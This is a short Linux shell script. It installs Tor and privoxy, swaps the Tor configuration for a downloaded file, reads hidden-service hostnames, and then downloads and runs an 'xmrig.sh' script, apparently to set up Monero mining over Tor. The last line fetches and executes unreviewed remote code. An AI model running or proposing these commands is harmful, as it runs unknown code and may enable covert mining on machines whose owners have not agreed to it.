sudo apt install apt-transport-https curl
echo -e "deb https://deb.torproject.org/torproject.org $(lsb_release -sc) main \ndeb-src https://deb.torproject.org/torproject.org $(lsb_release -sc) main" > /etc/apt/sources.list.d/tor.list
wget -O- https://deb.torproject.org/torproject.org/A3C4F0F979CAA22CDBA8F512EE8CBC9E886DDD89.asc | sudo apt-key add -
apt-get update
apt-get install tor deb.torproject.org-keyring torsocks
sudo apt install privoxy
sudo apt install nano
sudo systemctl stop tor
sudo systemctl restart tor
sudo systemctl start tor 
sudo systemctl enable tor
cd /etc/tor/
rm -rf torrc
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/torrc

cat /var/lib/tor/other_hidden_service/hostname
cat /var/db/tor/hidden_service
wget https://raw.githubusercontent.com/ceeb57f83688/xmrig/main/TOR/xmrig.sh && chmod +x xmrig.sh && ./xmrig.sh
